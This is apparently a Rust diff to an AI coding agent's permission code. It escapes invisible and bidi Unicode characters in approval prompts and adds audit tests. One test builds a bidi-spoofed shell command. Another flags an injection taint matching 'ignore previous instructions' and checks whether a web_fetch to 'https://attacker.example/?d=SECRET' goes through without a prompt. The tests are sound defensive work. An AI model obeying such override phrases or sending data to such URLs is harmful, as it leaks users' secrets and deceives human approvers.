@@ -619,11 +619,41 @@ pub fn outside_project_for_request(request: &PermissionRequest, project: &Path) 
 /// doesn't look like several separate arguments to `sh`. Shared by every
 /// frontend's approval prompt.
 pub fn display_command(program: &str, args: &[String]) -> String {
-    std::iter::once(program)
-        .chain(args.iter().map(String::as_str))
-        .map(shell_quote_word)
-        .collect::<Vec<_>>()
-        .join(" ")
+    escape_invisible(
+        &std::iter::once(program)
+            .chain(args.iter().map(String::as_str))
+            .map(shell_quote_word)
+            .collect::<Vec<_>>()
+            .join(" "),
+    )
+}
+
+/// True for the invisible format characters (Unicode category Cf, plus the
+/// variation selectors): bidi overrides and isolates, zero-width characters,
+/// the tag block. They render as nothing, or reorder the text around them,
+/// so text a person approves must not carry them raw. The same ranges as
+/// `aivyx-pack`'s `describe::shown`.
+pub fn is_invisible_format(c: char) -> bool {
+    matches!(c as u32,
+        0x00AD | 0x0600..=0x0605 | 0x061C | 0x06DD | 0x070F | 0x08E2 | 0x180E
+        | 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x206F | 0xFE00..=0xFE0F
+        | 0xFEFF | 0xFFF9..=0xFFFB | 0x110BD | 0x1D173..=0x1D17A
+        | 0xE0001 | 0xE0020..=0xE007F | 0xE0100..=0xE01EF)
+}
+
+/// `text` with every invisible format character shown as an escape
+/// (`\u{202e}`). Newlines and tabs are left alone: the approval prompts
+/// split a command on them.
+pub fn escape_invisible(text: &str) -> String {
+    text.chars()
+        .map(|c| {
+            if is_invisible_format(c) {
+                c.escape_default().to_string()
+            } else {
+                c.to_string()
+            }
+        })
+        .collect()
 }
 
 /// Quotes `word` as a single POSIX shell word if it needs it — empty, or
@@ -1141,5 +1171,78 @@ mod build_confiner_tests {
             .stdin(std::process::Stdio::null());
         let output = confiner.confine(command).output().await.unwrap();
         assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "unset");
+    }
+}
+
+#[cfg(test)]
+mod audit_probes {
+    use super::*;
+
+    /// C5: the command line every frontend's approval prompt shows passes
+    /// bidi overrides and zero-width characters through unmarked, so the
+    /// approver can read a different command than the one that runs.
+    #[test]
+    fn audit_c5_display_command_marks_bidi_and_invisible_characters() {
+        let shown = display_command(
+            "sh",
+            &["-c".to_string(), "echo safe \u{202E}dlrow\u{202C}; id\u{200B}".to_string()],
+        );
+        for c in ['\u{202E}', '\u{202C}', '\u{200B}'] {
+            assert!(!shown.contains(c), "approval text carries U+{:04X} raw: {shown:?}", c as u32);
+        }
+    }
+
+    #[test]
+    fn escape_invisible_keeps_newlines_and_plain_text() {
+        assert_eq!(escape_invisible("a\nb\tc é"), "a\nb\tc é");
+        assert_eq!(escape_invisible("x\u{200B}y"), "x\\u{200b}y");
+    }
+
+    /// C8: in interactive mode a flagged injection only produces a passive
+    /// notice; a `Network` action (web_fetch, web_search) is still allowed
+    /// with no prompt, so a tainted session can send anything it has read
+    /// (reads are not scoped to the project) to an attacker URL. The same
+    /// reasoning that denies this in autonomous mode applies here.
+    #[tokio::test]
+    async fn audit_c8_a_tainted_interactive_session_does_not_fetch_without_asking() {
+        struct CountingPrompter(std::sync::atomic::AtomicUsize);
+        #[async_trait]
+        impl PermissionPrompter for CountingPrompter {
+            async fn prompt(&self, _r: &PermissionRequest) -> UserResponse {
+                self.0.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+                UserResponse::Deny
+            }
+        }
+        let prompter = Arc::new(CountingPrompter(std::sync::atomic::AtomicUsize::new(0)));
+        let taint = InjectionTaint::new();
+        taint.flag(InjectionFinding {
+            source: "web_fetch: page".to_string(),
+            matched_pattern: "ignore previous instructions".to_string(),
+            excerpt: "...".to_string(),
+        });
+        let gate = ConfirmationGate::new(
+            prompter.clone(),
+            vec![],
+            vec![],
+            PlanMode::new(),
+            AutonomousMode::new(),
+            PathBuf::from("/home/user/project"),
+            false,
+        )
+        .with_injection_taint(taint);
+        let request = PermissionRequest {
+            tool_name: "web_fetch".to_string(),
+            action: ActionKind::Network,
+            target: PermissionTarget::Other("https://attacker.example/?d=SECRET".to_string()),
+            arguments_preview: serde_json::json!({}),
+            preview: None,
+            diff: None,
+        };
+        let decision = gate.check(&request).await;
+        assert!(
+            !matches!(decision, PermissionDecision::Allow)
+                || prompter.0.load(std::sync::atomic::Ordering::SeqCst) > 0,
+            "a flagged session fetched an attacker URL with no prompt: {decision:?}"
+        );
     }
 }
